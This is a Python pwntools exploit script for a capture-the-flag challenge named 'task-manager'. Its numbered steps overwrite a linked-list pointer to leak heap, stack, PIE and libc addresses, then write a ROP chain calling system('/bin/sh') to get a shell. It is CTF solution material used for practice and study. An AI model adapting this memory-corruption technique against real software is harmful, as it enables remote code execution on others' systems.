#!/usr/bin/env python3
from pwn import *

TARGET_PATH = os.path.realpath(
    "/ctf-writeups/2026/tamuctf/pwn/task-manager/dist/task-manager_patched"
)
LIBC_PATH = os.path.realpath(
    "/ctf-writeups/2026/tamuctf/pwn/task-manager/dist/libc.so.6"
)

elf = context.binary = ELF(TARGET_PATH)
libc = ELF(LIBC_PATH)

context.update(log_level="debug", terminal=["tmux", "split-window", "-h"])


def get_stream():
    if "remote" in sys.argv:
        return remote("streams.tamuctf.com", 443, ssl=True, sni="task-manager")

    return process(TARGET_PATH, aslr=False)


def attach_gdb(r):
    if "debug" in sys.argv:
        bkps = []
        cmds = []

        gdbscript = ["break {}".format(x) for x in bkps] + cmds
        gdb.attach(r, "\n".join(gdbscript))


def add_task(r, data):
    r.sendlineafter(b"input: ", b"1")
    r.sendafter(b": ", data)


def exploit(r):
    r.sendlineafter(b": ", b"A")

    # 1. Overwrite 'next' to leak Heap address and calculate 'taskPointer' address
    payload = b"A" * 0x50
    add_task(r, payload)
    r.recvuntil(payload)
    next_ptr = u64(r.recvline().strip().ljust(8, b"\0"))
    head = next_ptr - 0xC0

    # 2. Overwrite 'next' with 'head' to leak Stack address from taskPointer->head
    payload = b"A" * 0x50
    payload += p64(head)
    add_task(r, payload)

    payload = b"A" * 0x8
    add_task(r, payload)
    r.recvuntil(payload)
    stack_leak = u64(r.recvline().strip().ljust(8, b"\0"))
    stack_ret = stack_leak + 0xB0
    stack_main = stack_leak + 0xC0

    # 3. Leak PIE base using stack_main
    payload = b"A" * 0x50
    payload += p64(stack_main - 0x8)
    add_task(r, payload)

    payload = b"A" * 0x8
    add_task(r, payload)
    r.recvuntil(payload)
    main = u64(r.recvline().strip().ljust(8, b"\0"))
    elf.address = main - elf.sym.main

    # 4. Leak Libc base using stack_ret
    payload = b"A" * 0x50
    payload += p64(stack_ret - 0x8)
    add_task(r, payload)

    payload = b"A" * 0x8
    add_task(r, payload)
    r.recvuntil(payload)
    libc_ret = u64(r.recvline().strip().ljust(8, b"\0"))
    libc.address = libc_ret - libc.libc_start_main_return

    # 5. Write ROP chain to stack
    payload = b"A" * 0x50
    payload += p64(stack_ret)
    add_task(r, payload)

    rop = ROP(libc)
    sh = next(libc.search(b"/bin/sh\0"))
    rop.raw(rop.ret)
    rop.system(sh)
    add_task(r, rop.chain())

    # 6. Reset global 'size' to 0 to prevent crash in cleanup() during Exit
    payload = b"A" * 0x50
    payload += p64(elf.sym.size)
    add_task(r, payload)
    add_task(r, p64(0))

    # 7. Exit
    r.sendlineafter(b"input: ", b"5")
    r.interactive()


def main():
    r = get_stream()
    attach_gdb(r)
    exploit(r)


if __name__ == "__main__":
    main()
